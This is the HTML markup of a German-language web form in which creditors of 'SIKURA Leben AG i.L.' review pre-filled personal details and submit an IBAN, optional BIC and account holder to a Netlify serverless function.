<!doctype html>
<html lang="de"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>IBAN-Erfassung – SIKURA Leben AG i.L.</title><link rel="stylesheet" href="style.css"/></head>
<body><main class="container">
<section><h1>Bitte bestätigen Sie Ihre bereits erfassten Daten</h1>
<p class="hint">Die folgenden Angaben stammen aus Ihrem bereits bestätigten Verify‑Prozess und sind nur zur Kontrolle sichtbar.</p>
<div class="grid">
<label>Gläubiger‑Nr.<input id="ro_creditor" disabled/></label>
<label>Vorname<input id="ro_firstname" disabled/></label>
<label>Nachname<input id="ro_lastname" disabled/></label>
<label>Strasse<input id="ro_street" disabled/></label>
<label>Nr.<input id="ro_houseno" disabled/></label>
<label>PLZ<input id="ro_zip" disabled/></label>
<label>Ort<input id="ro_city" disabled/></label>
<label>Land<input id="ro_country" disabled/></label>
</div></section><hr/>
<section><h2>IBAN erfassen</h2>
<form id="ibanForm" method="POST" action="/.netlify/functions/iban_submit" novalidate>
<label>IBAN*<input id="iban" name="iban" required maxlength="34" placeholder="CH93 0076 2011 6238 5295 7"/></label>
<label>BIC (optional)<input id="bic" name="bic" maxlength="11" placeholder="ZKBKCHZZ80A"/></label>
<label>Kontoinhaber (optional)<input id="acc_holder" name="glaeubiger" autocomplete="name"/></label>
<input type="hidden" id="hid_id" name="id"/><input type="hidden" id="hid_token" name="token"/>
<input type="hidden" id="hid_em" name="em"/><input type="hidden" id="hid_lang" name="lang"/>
<div class="checks"><label><input type="checkbox" required/> Ich bestätige, dass die Angaben korrekt sind.</label>
<label><input type="checkbox" required/> Ich stimme der Verarbeitung gemäss Datenschutzhinweisen zu.</label></div>
<button type="submit">Senden</button>
<p class="small"><a href="/privacy.html" target="_blank" rel="noopener">Datenschutzhinweise</a></p>
</form></section></main><script src="script.js"></script></body></html>
